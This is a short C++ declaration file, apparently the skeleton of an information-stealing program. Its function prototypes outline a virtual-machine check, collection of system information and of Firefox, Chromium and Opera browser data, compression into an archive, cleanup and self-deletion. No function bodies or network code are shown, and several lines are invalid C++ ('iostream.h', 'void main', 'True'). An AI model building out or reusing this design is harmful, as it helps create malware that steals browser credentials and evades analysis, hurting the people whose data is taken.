#include <stdlib.h>
#include <time.h>
#include <iostream.h>

using namespace std;

void main();
int performChecks(bool vmDetect=True);
int createArchiveDestination(string archiveName);
int fetchSysInfo(string archiveName);
int fetchFirefox(string archiveName);
int fetchChromium(string archiveName);
int fetchOpera(string archiveName);
int compressArchive(string archiveName);
int cleanUp(string archiveName);
void selfRemove();

class SystemInformation{
    public:
        void setTime();
    private:
        string systemPlatform;
        string systemHostname;
        string time;
};